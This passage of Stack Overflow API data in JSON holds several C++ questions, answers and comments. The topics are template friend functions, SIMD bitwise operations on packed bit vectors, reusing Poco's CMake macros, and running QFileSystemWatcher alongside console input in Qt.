rel=\"nofollow\">http://gnuwin32.sourceforge.net/packages/tiff.htm</a></p>\n"}, {"tags": ["c++"], "comments": [{"owner": {"reputation": 35670, "user_id": 420683, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/68b74cb21e360e5601ce6c812f59a136?s=128&d=identicon&r=PG", "display_name": "dyp", "link": "https://stackoverflow.com/users/420683/dyp"}, "edited": false, "score": 4, "creation_date": 1429734478, "post_id": 29808044, "comment_id": 47744366, "body": "<i>&quot;whenever I try to define it outside VS2013 yields linker error.&quot;</i> Please show us your attempts and the linker error. An <a href=\"http://stackoverflow.com/help/mcve\">MCVE</a> would be much appreciated."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2249683"}, "edited": false, "score": 1, "creation_date": 1429734802, "post_id": 29808044, "comment_id": 47744569, "body": "Scrape <code>typename Outer&lt;T&gt;::</code> in the friend declaration."}, {"owner": {"reputation": 35670, "user_id": 420683, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/68b74cb21e360e5601ce6c812f59a136?s=128&d=identicon&r=PG", "display_name": "dyp", "link": "https://stackoverflow.com/users/420683/dyp"}, "edited": false, "score": 0, "creation_date": 1429743651, "post_id": 29808044, "comment_id": 47748882, "body": "The <code>doSth</code> friend is not a function template. It is an ordinary function whose parameters are class template specializations. See the answers to the duplicate question."}], "owner": {"reputation": 4198, "user_id": 4396113, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/026c3ac09dad11029efe60f660e21dd5?s=128&d=identicon&r=PG&f=1", "display_name": "moped", "link": "https://stackoverflow.com/users/4396113/moped"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 110, "favorite_count": 0, "closed_date": 1429735534, "answer_count": 0, "score": 1, "last_activity_date": 1429738592, "creation_date": 1429734185, "last_edit_date": 1429738592, "question_id": 29808044, "link": "https://stackoverflow.com/questions/29808044/declaring-friend-function-of-nested-class-of-template-class", "closed_reason": "Duplicate", "title": "Declaring friend function of nested class of template class", "body": "<p>I am trying to find a way to declare a function in specific manner. The code looks like this:</p>\n\n<pre><code>template&lt;typename T&gt;\n    class Outer {\n        class Inner {\n            public:\n            friend void doSth(const typename Outer&lt;T&gt;::Inner&amp; inner1, const typename Outer&lt;T&gt;::Inner&amp; inner2);\n    }\n}\n</code></pre>\n\n<p>What I am trying to do is to define this function outside declaration. I can easily do it inside but whenever I try to define it outside VS2013 yields linker error. Could you help me with this problem?</p>\n\n<p>Yes, I tried predefining these methods before inner class definition but nothing actually works for me</p>\n\n<p>EDIT:</p>\n\n<pre><code>template&lt;typename T&gt;\nclass Outer\n{\npublic:\n    class Inner;\n};\n\ntemplate&lt;typename T&gt; void doSth(typename Outer&lt;T&gt;::Inner&amp;ob1, typename Outer&lt;T&gt;::Inner&amp; ob2);\ntemplate&lt;typename T&gt;\nclass Outer&lt;T&gt;::Inner\n{\n    friend void doSth&lt;&gt;(Inner&amp; ob1, Inner&amp; ob2);\n};\n\ntemplate&lt;typename T&gt;\nvoid doSth(typename Outer&lt;T&gt;::Inner&amp;ob1, typename Outer&lt;T&gt;::Inner&amp; ob2)\n{\n    cout &lt;&lt; \"sth\";\n}\n\nint main()\n{\n    Outer&lt;int&gt;::Inner ob;\n    doSth(ob, ob);\n    return 0;\n}\n</code></pre>\n\n<p>For example this approach results in an error.</p>\n\n<pre><code>1&gt;main.obj : error LNK2019: unresolved external symbol \"void __cdecl doSth(class Outer&lt;int&gt;::Inner &amp;,class Outer&lt;int&gt;::Inner &amp;)\" (?doSth@@YAXAAVInner@?$Outer@H@@0@Z) referenced in function _main\n1&gt;Project.exe : fatal error LNK1120: 1 unresolved externals\n</code></pre>\n"}, {"tags": ["c++", "optimization", "boost", "vectorization", "bitwise-operators"], "comments": [{"owner": {"reputation": 7865, "user_id": 2331956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ede184a71447fbba327ad6190c079888?s=128&d=identicon&r=PG", "display_name": "Mike Vine", "link": "https://stackoverflow.com/users/2331956/mike-vine"}, "edited": false, "score": 0, "creation_date": 1429734733, "post_id": 29807944, "comment_id": 47744527, "body": "I&#39;d like a real answer to this, but my gut is that for x64 its just intelligent use of the mmXXX_op_siXXX SIMD intrinsics where op is {and|xor|or|andnot} XXX is the width of the SIMD intrinisic you want {128|256|512}. E.g see mm256_and_si256 on <a href=\"https://software.intel.com/sites/landingpage/IntrinsicsGuide/\" rel=\"nofollow noreferrer\">this page</a> for the AVX  version of <code>256bit and</code> in a single instruction. Obviously you need aligned loading &amp; saving and picking up of left over bytes etc"}, {"owner": {"reputation": 15468, "user_id": 321772, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/c03247f45c9f291391b894375c2709ca?s=128&d=identicon&r=PG", "display_name": "Adam", "link": "https://stackoverflow.com/users/321772/adam"}, "edited": false, "score": 0, "creation_date": 1429735417, "post_id": 29807944, "comment_id": 47744923, "body": "If you&#39;re not willing to convert your datastructures, that probably takes you out of SIMD intrinsics too. I think your best bet is to set your function up so the compiler can auto-vectorize. Your <code>__restrict__</code> already helps. Use <code>-ftree-vectorizer-verbose=3</code> switch to GCC to find out whether or not the compiler was able to vectorize the loop."}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1429735861, "post_id": 29807944, "comment_id": 47745183, "body": "If you can afford to give up the bit level random access capability, it&#39;ll be a lot easier. For example, you can pack 64 <code>bool</code>s to an <code>uint64_t</code>, and store the <code>uint64_t</code> to std::valarray&lt;uint64_t&gt;, then use arithmetic API from <code>std::valarray</code>. Or pack even more <code>bool</code>s to even larger integer types, and write the container and operator yourself."}, {"owner": {"reputation": 85518, "user_id": 1593077, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/10c44e0d9568e48d05708ae196ad936f?s=128&d=identicon&r=PG", "display_name": "einpoklum", "link": "https://stackoverflow.com/users/1593077/einpoklum"}, "reply_to_user": {"reputation": 15468, "user_id": 321772, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/c03247f45c9f291391b894375c2709ca?s=128&d=identicon&r=PG", "display_name": "Adam", "link": "https://stackoverflow.com/users/321772/adam"}, "edited": false, "score": 0, "creation_date": 1429736360, "post_id": 29807944, "comment_id": 47745537, "body": "@Adam: No it doesn&#39;t... I just need to split the handling of the first several unaligned bytes, then handle the large chunk, then the trailing bytes"}, {"owner": {"reputation": 85518, "user_id": 1593077, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/10c44e0d9568e48d05708ae196ad936f?s=128&d=identicon&r=PG", "display_name": "einpoklum", "link": "https://stackoverflow.com/users/1593077/einpoklum"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1429736577, "post_id": 29807944, "comment_id": 47745650, "body": "@user3528438: Can I do this without actually copying anything? I mean, I can just think of my <code>char*</code> as a <code>uint64_t*</code> with length/8 (assuming alignment of course). In that case, can an <code>std::valarray</code> wrap an existing raw array?"}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1429736851, "post_id": 29807944, "comment_id": 47745795, "body": "@einpoklum According to constructor(4), yes, it can be used that way, but note that data is deep-copied. <a href=\"http://en.cppreference.com/w/cpp/numeric/valarray/valarray\" rel=\"nofollow noreferrer\">en.cppreference.com/w/cpp/numeric/valarray/valarray</a>"}, {"owner": {"reputation": 85518, "user_id": 1593077, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/10c44e0d9568e48d05708ae196ad936f?s=128&d=identicon&r=PG", "display_name": "einpoklum", "link": "https://stackoverflow.com/users/1593077/einpoklum"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1429737207, "post_id": 29807944, "comment_id": 47745985, "body": "@user3528438: Umm, you seem to be saying that it <i>can&#39;t</i> be used that way. i.e. it can&#39;t be constructed with an array without copying the values somewhere else."}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1429737567, "post_id": 29807944, "comment_id": 47746204, "body": "@einpoklum It&#39;s still useful if you can afford such a copy. Actually I prefer doing it the other way: allocate <code>std::valarray&lt;uint64_t&gt;</code> first with constructor(2), then downgrade it to <code>uint64_t *</code> and further to <code>char *</code> and pass it to user to fill data in."}, {"owner": {"reputation": 85518, "user_id": 1593077, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/10c44e0d9568e48d05708ae196ad936f?s=128&d=identicon&r=PG", "display_name": "einpoklum", "link": "https://stackoverflow.com/users/1593077/einpoklum"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1429737628, "post_id": 29807944, "comment_id": 47746234, "body": "@user3528438: This copying means about doubling the execution time - that&#39;s not tolerable..."}], "answers": [{"tags": [], "owner": {"reputation": 7865, "user_id": 2331956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ede184a71447fbba327ad6190c079888?s=128&d=identicon&r=PG", "display_name": "Mike Vine", "link": "https://stackoverflow.com/users/2331956/mike-vine"}, "is_accepted": false, "score": 2, "last_activity_date": 1429743156, "last_edit_date": 1429743156, "creation_date": 1429742732, "answer_id": 29810291, "question_id": 29807944, "link": "https://stackoverflow.com/questions/29807944/how-to-effectively-apply-bitwise-operation-to-large-packed-bit-vectors/29810291#29810291", "title": "How to effectively apply bitwise operation to (large) packed bit vectors?", "body": "<p>This answer is going to assume you want the <em>fastest possible way</em> and are happy to use platform specific things. You optimising compiler may be able to produce similar code to the below from normal C but in my experiance across a few compilers something as specific as this is still best hand-written.</p>\n\n<p>Obviously like all optimisation tasks, <em>never assume</em> anything is better/worse and measure, measure, measure.</p>\n\n<p>If you could lock down you architecture to x86 with at least SSE3 you would do:</p>\n\n<pre><code>void bitwise_and(\n    char*       result,\n    const char* lhs,\n    const char* rhs,\n    size_t      length)\n{\n    while(length &gt;= 16)\n    {\n        // Load in 16byte registers\n        auto lhsReg = _mm_loadu_si128((__m128i*)lhs);\n        auto rhsReg = _mm_loadu_si128((__m128i*)rhs);\n\n        // do the op\n        auto res = _mm_and_si128(lhsReg, rhsReg);\n\n        // save off again\n        _mm_storeu_si128((__m128i*)result, res);\n\n        // book keeping\n        length -= 16;\n        result += 16;\n        lhs += 16;\n        rhs += 16;\n    }\n\n    // do the tail end. Assuming that the array is large the\n    // most that the following code can be run is 15 times so I'm not\n    // bothering to optimise. You could do it in 64 bit then 32 bit\n    // then 16 bit then char chunks if you wanted...\n    while (length)\n    {\n        *result = *lhs &amp; *rhs;\n        length -= 1;\n        result += 1;\n        lhs += 1;\n        rhs += 1;\n    }\n}\n</code></pre>\n\n<p>This compiles to ~10asm instructions per 16 bytes (+ change for the leftover and a little overhead).</p>\n\n<p>The great thing about doing intrinsics like this (over hand rolled asm) is that the compiler is still free to do additional optimisations (such as loop unrolling) ontop of what you write. It also handles register allocation.</p>\n\n<p>If you could guarantee aligned data you could save an asm instruction (use _mm_load_si128 instead and the compiler will be clever enough to avoid a second load and use it as an direct mem operand to the 'pand'.</p>\n\n<p>If you could guarantee AVX2+ then you could use the 256 bit version and handle 10asm instructions per 32 bytes.</p>\n\n<p>On arm theres similar NEON instructions.</p>\n\n<p>If you wanted to do multiple ops just add the relevant intrinsic in the middle and it'll add 1 asm instruction per 16 bytes.</p>\n\n<p>I'm pretty sure with a decent processor you dont need any additional cache control.</p>\n"}, {"comments": [{"owner": {"reputation": 85518, "user_id": 1593077, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/10c44e0d9568e48d05708ae196ad936f?s=128&d=identicon&r=PG", "display_name": "einpoklum", "link": "https://stackoverflow.com/users/1593077/einpoklum"}, "edited": false, "score": 0, "creation_date": 1429817725, "post_id": 29820631, "comment_id": 47792089, "body": "You&#39;re right, of course, about the arithmetic intensity - it is rather negligible. It seems to me it&#39;s more about the memory access patterns. However, in my use case, the details of which I won&#39;t go into here, there&#39;s not much to compose, and if there is, it&#39;ll be composed at the level of the lambda applied to individual bits (or the 64-bit vectors held by a single <code>uint64_t</code>)."}, {"owner": {"reputation": 52741, "user_id": 555045, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/182d0ce855c8324a596648c04643e8f9?s=128&d=identicon&r=PG", "display_name": "nicomp", "link": "https://stackoverflow.com/users/555045/nicomp"}, "reply_to_user": {"reputation": 85518, "user_id": 1593077, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/10c44e0d9568e48d05708ae196ad936f?s=128&d=identicon&r=PG", "display_name": "einpoklum", "link": "https://stackoverflow.com/users/1593077/einpoklum"}, "edited": false, "score": 0, "creation_date": 1429820402, "post_id": 29820631, "comment_id": 47793668, "body": "@einpoklum ok then, carry on"}], "tags": [], "owner": {"reputation": 52741, "user_id": 555045, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/182d0ce855c8324a596648c04643e8f9?s=128&d=identicon&r=PG", "display_name": "nicomp", "link": "https://stackoverflow.com/users/555045/nicomp"}, "is_accepted": false, "score": 0, "last_activity_date": 1429784680, "creation_date": 1429784680, "answer_id": 29820631, "question_id": 29807944, "link": "https://stackoverflow.com/questions/29807944/how-to-effectively-apply-bitwise-operation-to-large-packed-bit-vectors/29820631#29820631", "title": "How to effectively apply bitwise operation to (large) packed bit vectors?", "body": "<p>Don't do it this way. The individual operations will look great, sleek asm, nice performance .. but a composition of them will be terrible. You cannot make this abstraction, nice as it looks. The arithmetic intensity of those kernels is almost the worst possible (the only worse one is doing <em>no</em> arithmetic, such as a straight up copy), and composing them at a high level will retain that awful property. In a sequence of operations each using the result of the previous one, the results are written and read again a lot later (in the next kernel), even though the high level flow could be transposed so that the result the \"next operation\" needs is right there in a register. Also, if the same argument appears twice in an expression tree (and not both as operands to one operation), they will be streamed in twice, instead of reusing the data for two operations.</p>\n\n<p>It doesn't have that nice warm fuzzy feeling of \"look at all this lovely abstraction\" about it, but what you should do is find out at a high level how you're combining your vectors, and then try to chop that in pieces that make sense from a performance perspective. In some cases that may mean making big ugly messy loops that will make people get an extra coffee before diving in, that's just too bad then. If you want performance, you often have to sacrifice something else. Usually it's not so bad, it probably just means you have a loop that has an expression consisting of intrinsics in it, instead of an expression of vector-operations that each individually have a loop.</p>\n"}], "owner": {"reputation": 85518, "user_id": 1593077, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/10c44e0d9568e48d05708ae196ad936f?s=128&d=identicon&r=PG", "display_name": "einpoklum", "link": "https://stackoverflow.com/users/1593077/einpoklum"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 792, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1546727797, "creation_date": 1429733833, "last_edit_date": 1546727797, "question_id": 29807944, "link": "https://stackoverflow.com/questions/29807944/how-to-effectively-apply-bitwise-operation-to-large-packed-bit-vectors", "title": "How to effectively apply bitwise operation to (large) packed bit vectors?", "body": "<p>I want to implement</p>\n\n<pre><code>void bitwise_and(\n    char*       __restrict__  result,\n    const char* __restrict__  lhs,\n    const char* __restrict__  rhs,\n    size_t                    length);\n</code></pre>\n\n<p>or maybe a <code>bitwise_or()</code>, <code>bitwise_xor()</code> or any other bitwise operation. Obviously it's not about the algorithm, just the implementation details - alignment, loading the largest possible element from memory, cache-awareness, using SIMD instructions etc.</p>\n\n<p>I'm sure this has (more than one) fast existing implementations, but I would guess most library implementations would require some fancy container, e.g. <code>std::bitset</code> or <code>boost::dynamic_bit_set</code> - but I don't want to spend the time constructing one of those.</p>\n\n<p>So do I... Copy-paste from an existing library? Find a library which can 'wrap' a raw packed bits array in memory with a nice object? Roll my own implementation anyway?</p>\n\n<p><strong>Notes:</strong> </p>\n\n<ul>\n<li>I'm mostly interested in C++ code, but I certainly don't mind a plain C approach.</li>\n<li>Obviously, making copies of the input arrays is out of the question - that would probably nearly-double the execution time.</li>\n<li>I intentionally did not template the bitwise operator, in case there's some specific optimization for OR, or for AND etc.</li>\n<li>Bonus points for discussing operations on multiple vectors at once, e.g. V_out = V_1 bitwise-and V_2 bitwise-and V_3 etc.</li>\n<li>I noted <a href=\"http://www.cs.up.ac.za/cs/vpieterse/pub/PieterseEtAl_SAICSIT2010.pdf\" rel=\"nofollow noreferrer\">this article</a> comparing library implementations, but it's from 5 years ago. I can't ask which library to use since that would violate SO policy I guess...</li>\n<li>If it helps you any, assume its <code>uint64_t</code>s rather than <code>char</code>s (that doesn't really matter - if the char array is unaligned we can just treated the heading and trailing chars separately).</li>\n</ul>\n"}, {"tags": ["c++", "c++11", "cmake", "poco-libraries"], "comments": [{"owner": {"reputation": 17210, "user_id": 2436175, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/CK0Zo.png?s=128&g=1", "display_name": "Antonio", "link": "https://stackoverflow.com/users/2436175/antonio"}, "edited": false, "score": 0, "creation_date": 1430349293, "post_id": 29807857, "comment_id": 48033268, "body": "Any feedback for the answers?"}, {"owner": {"reputation": 11354, "user_id": 70600, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/6123be50f7a10302e7bf59dcdc5e2623?s=128&d=identicon&r=PG", "display_name": "ruipacheco", "link": "https://stackoverflow.com/users/70600/ruipacheco"}, "reply_to_user": {"reputation": 17210, "user_id": 2436175, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/CK0Zo.png?s=128&g=1", "display_name": "Antonio", "link": "https://stackoverflow.com/users/2436175/antonio"}, "edited": false, "score": 0, "creation_date": 1430586858, "post_id": 29807857, "comment_id": 48128789, "body": "Haven&#39;t been able to work on this as the day job keeps me very busy."}], "answers": [{"tags": [], "owner": {"reputation": 4123, "user_id": 3378179, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/3mmbS.png?s=128&g=1", "display_name": "Caduchon", "link": "https://stackoverflow.com/users/3378179/caduchon"}, "is_accepted": true, "score": 2, "last_activity_date": 1459330469, "last_edit_date": 1459330469, "creation_date": 1429734982, "answer_id": 29808275, "question_id": 29807857, "link": "https://stackoverflow.com/questions/29807857/where-to-place-cmake-macro-definitions/29808275#29808275", "title": "Where to place CMake macro definitions?", "body": "<p>I'm not sure to well understand what you need. But why not simply include de file containing the macros by this way with cmake ?</p>\n\n<pre><code>include(path/to/Poco/cmake/macros.cmake)\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 4123, "user_id": 3378179, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/3mmbS.png?s=128&g=1", "display_name": "Caduchon", "link": "https://stackoverflow.com/users/3378179/caduchon"}, "edited": false, "score": 0, "creation_date": 1459330421, "post_id": 29809315, "comment_id": 60233435, "body": "Bad answer because it&#39;s intrusive in the Poco project, and then you have to duplicate it to avoid conflicts with other application using Poco. Moreover, you have no assurance your modifications works with another system configuration (it&#39;s the goal of CMake...) after removing parts."}], "tags": [], "owner": {"reputation": 17210, "user_id": 2436175, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/CK0Zo.png?s=128&g=1", "display_name": "Antonio", "link": "https://stackoverflow.com/users/2436175/antonio"}, "is_accepted": false, "score": -1, "last_activity_date": 1429738554, "creation_date": 1429738554, "answer_id": 29809315, "question_id": 29807857, "link": "https://stackoverflow.com/questions/29807857/where-to-place-cmake-macro-definitions/29809315#29809315", "title": "Where to place CMake macro definitions?", "body": "<ul>\n<li>Take the Poco project</li>\n<li>Open the main CMakeLists.txt of Poco and comment (with <code>#</code>) all the <code>add_subdirectory</code> commands for the directories you don't need.</li>\n<li>Try to build Poco</li>\n<li>If it fails, add back the directories which contains the missing dependencies (in short, you might think you don't need a directory, but it might be that one of the directories you need depends on another directory)</li>\n<li>When it builds, you can delete all the directories for which you have removed the command <code>add_subdirectory</code>  </li>\n</ul>\n"}], "owner": {"reputation": 11354, "user_id": 70600, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/6123be50f7a10302e7bf59dcdc5e2623?s=128&d=identicon&r=PG", "display_name": "ruipacheco", "link": "https://stackoverflow.com/users/70600/ruipacheco"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 579, "favorite_count": 0, "accepted_answer_id": 29808275, "answer_count": 2, "score": 2, "last_activity_date": 1459330469, "creation_date": 1429733585, "question_id": 29807857, "link": "https://stackoverflow.com/questions/29807857/where-to-place-cmake-macro-definitions", "title": "Where to place CMake macro definitions?", "body": "<p>I'm writing an application that relies on the <a href=\"https://github.com/pocoproject/poco\" rel=\"nofollow\">Poco</a> project. I just need a few sub modules but they use macros defined by the Poco project which are stored in a cmake folder at the root of the Poco folder structure.</p>\n\n<p>I don't want to drag the whole Poco folder as I don't want to link my project to the whole Poco framework. How can I make those macros available to my project?</p>\n"}, {"tags": ["c++", "qt", "console", "qfilesystemwatcher"], "comments": [{"owner": {"reputation": 233737, "user_id": 1774667, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/b6516fec2c5997b867545d285304cf12?s=128&d=identicon&r=PG", "display_name": "Yakk - Adam Nevraumont", "link": "https://stackoverflow.com/users/1774667/yakk-adam-nevraumont"}, "edited": false, "score": 0, "creation_date": 1429734024, "post_id": 29807758, "comment_id": 47744084, "body": "You call <code>consoleMain</code> explicitly.  Until it finishes running, it runs.  As far as I know, Qt has little console support.  Possibly the easiest way to solve it would be to have one thread sitting on the console, and the main event loop running on a different thread, and have the console send messages to communicate with the main event loop?  Google finds <a href=\"http://stackoverflow.com/a/18889631/1774667\">stackoverflow.com/a/18889631/1774667</a> answer which seems to relay characters typed via messages, which you&#39;d have to reconstitute manually."}], "answers": [{"tags": [], "owner": {"reputation": 459, "user_id": 4821153, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/e0d9d9969534941d0bd55b8833e08b66?s=128&d=identicon&r=PG&f=1", "display_name": "Varius", "link": "https://stackoverflow.com/users/4821153/varius"}, "is_accepted": true, "score": 1, "last_activity_date": 1429820215, "creation_date": 1429820215, "answer_id": 29833490, "question_id": 29807758, "link": "https://stackoverflow.com/questions/29807758/qfilesystemwatcher-does-not-emit-filechanged-in-console-application/29833490#29833490", "title": "QFileSystemWatcher does not emit fileChanged() in console application", "body": "<p>Ok, it is solved. I've tried Yakk's idea using different threads (thanks for the idea Yakk). I had to introduce a new subclass of <code>QObject</code> called <code>MyObject</code>. In its constructor I create the <code>Console</code> and a new <code>QThread</code> for the console object. The <code>QFileSystemWatcher</code> is created in <em>main.cpp</em> as well as  an instance of <code>MyObjcet</code>. See code below:</p>\n\n<p><strong>myobject.h</strong></p>\n\n<pre><code>#ifndef MYOBJECT_H\n#define MYOBJECT_H\n\n#include \"console.h\"\n#include &lt;QThread&gt;\n#include &lt;QCoreApplication&gt;\n\nclass MyObject : public QObject\n{\n    Q_OBJECT\n\npublic:\n\n    MyObject(QObject *parent = 0);\n    ~MyObject();\n\nprivate:\n\n    QThread *thread;\n    Console *console;\n\nsignals:\n\n    void signalStart();\n\npublic slots:\n\n    void slotFileChanged(QString text);\n    void slotEnd();\n};\n\n#endif // MYOBJECT_H\n</code></pre>\n\n<p><strong>myobject.cpp</strong></p>\n\n<pre><code>#include \"myobject.h\"\n\nMyObject::MyObject(QObject *parent): QObject(parent)\n{\n    console = new Console;\n\n    thread = new QThread(this);\n    console-&gt;moveToThread(thread);\n    thread-&gt;start();\n\n    connect(this, SIGNAL(signalStart()), console, SLOT(consoleMain()));\n    connect(console, SIGNAL(signalEnd()), this, SLOT(slotEnd()));\n    emit signalStart();\n}\n\nMyObject::~MyObject()\n{\n    thread-&gt;quit();\n    thread-&gt;wait();\n}\n\nvoid MyObject::slotFileChanged(QString text)\n{\n    console-&gt;displayChangedFileText(text);\n}\n\nvoid MyObject::slotEnd()\n{\n    QCoreApplication::exit(0);\n}\n</code></pre>\n\n<p><strong>main.cpp</strong></p>\n\n<pre><code>#include \"myobject.h\"\n#include &lt;QTimer&gt;\n\nint main(int argc, char *argv[])\n{\n    QCoreApplication a(argc, argv);\n\n    QFileSystemWatcher *watcher = new QFileSystemWatcher(&amp;a);\n    watcher-&gt;addPath(\"C:/MyTextFile.txt\");\n\n    MyObject *object = new MyObject(&amp;a);\n\n    QObject::connect(watcher, SIGNAL(fileChanged(QString)), object, SLOT(slotFileChanged(QString)));\n\n    std::cout &lt;&lt; \"Enter main event loop now\" &lt;&lt; std::endl;\n    return a.exec();\n}\n</code></pre>\n\n<p><em>console.h/.cpp</em> are unchnaged, only <code>Console::slotFileChanged(QString)</code> was replaced by <code>Console::displayChangedFileText(QString)</code>.</p>\n"}], "owner": {"reputation": 459, "user_id": 4821153, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/e0d9d9969534941d0bd55b8833e08b66?s=128&d=identicon&r=PG&f=1", "display_name": "Varius", "link": "https://stackoverflow.com/users/4821153/varius"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1772, "favorite_count": 0, "accepted_answer_id": 29833490, "answer_count": 1, "score": 2, "last_activity_date": 1429820215, "creation_date": 1429733229, "question_id": 29807758, "link": "https://stackoverflow.com/questions/29807758/qfilesystemwatcher-does-not-emit-filechanged-in-console-application", "title": "QFileSystemWatcher does not emit fileChanged() in console application", "body": "<p>in my files <em>console.h/.cpp</em> i have a small class which just asks the user to type in some text and then just prints the text again until the user enters \"quit\" (see method <code>consoleMain()</code>). However, in <em>main.cpp</em> I also have a\n<code>QFileSystemWatcher</code> which watches the file <em>MyTextFile.txt</em> and calls <code>Console::slotFileChanged(QString)</code> whenever the text file changes. Unfortunately the <code>QFileSystemWatcher</code> does not work. <code>Console::slotFileChanged(QString)</code> is never executed when I change the text file. As far as I know, <code>QFileSystemWatcher</code> works only if the main event loop has been started and this is also the case in my code.\nWhen I disable the <code>QTimer::singlaShot</code> in the <em>main.cpp</em> and replace it by <code>emit console.signalStart()</code>\nthe main event loop will not be entered, but I see the message of the <code>QFileSystemWatcher</code> (\"File changed!\") <strong>after I enter \"quit\"</strong>.\nThe question is: Is it possible to let the user interact with the console and let the FileWatcher emit the signal when the text file is changed in parallel?\n(I've also tried to put the <code>QFileSystemWatcher</code> into the console class and creating it on the heap; unfortunately it didn't change anything)</p>\n\n<p>Here is my code:</p>\n\n<p><strong>console.h</strong></p>\n\n<pre><code>#ifndef CONSOLE_H\n#define CONSOLE_H\n\n#include &lt;iostream&gt;\n#include &lt;QObject&gt;\n#include &lt;QFileSystemWatcher&gt;\n\nclass Console: public QObject\n{\n    Q_OBJECT\n\npublic:\n\n    Console(QObject *parent = 0);\n    ~Console();\n\nsignals:\n\n    void signalStart();\n    void signalEnd();\n\npublic slots:\n\n    void consoleMain();\n    void slotFileChanged(QString text);\n    void slotEmit();\n};\n\n#endif // CONSOLE_H\n</code></pre>\n\n<p><strong>console.cpp</strong></p>\n\n<pre><code>#include \"console.h\"\n\nConsole::Console(QObject *parent): QObject(parent)\n{\n}\n\nConsole::~Console()\n{\n}\n\nvoid Console::consoleMain()\n{\n    bool isRunning = true;\n    std::string in;\n\n    while (isRunning)\n    {\n        std::cout &lt;&lt; \"&gt;\" &lt;&lt; std::flush;\n        std::getline(std::cin, in);\n\n        if (in.compare(\"quit\") == 0)\n            isRunning = false;\n        else\n            std::cout &lt;&lt; \"You have entered: \" &lt;&lt; in &lt;&lt; std::endl;\n    }\n\n    emit signalEnd();\n}\n\nvoid Console::slotFileChanged(QString text)\n{\n    Q_UNUSED(text);\n    std::cout &lt;&lt; \"File changed!\" &lt;&lt; std::endl;\n}  \n\nvoid Console::slotEmit()\n{\n    emit signalStart();\n}\n</code></pre>\n\n<p><strong>main.cpp</strong></p>\n\n<pre><code>#include \"console.h\"\n#include &lt;QCoreApplication&gt;\n#include &lt;QTimer&gt;\n\nint main(int argc, char *argv[])\n{\n    QCoreApplication a(argc, argv);\n\n    QFileSystemWatcher watcher(&amp;a);\n    watcher.addPath(\"C:/MyTextFile.txt\");\n\n    Console console(&amp;a);\n\n    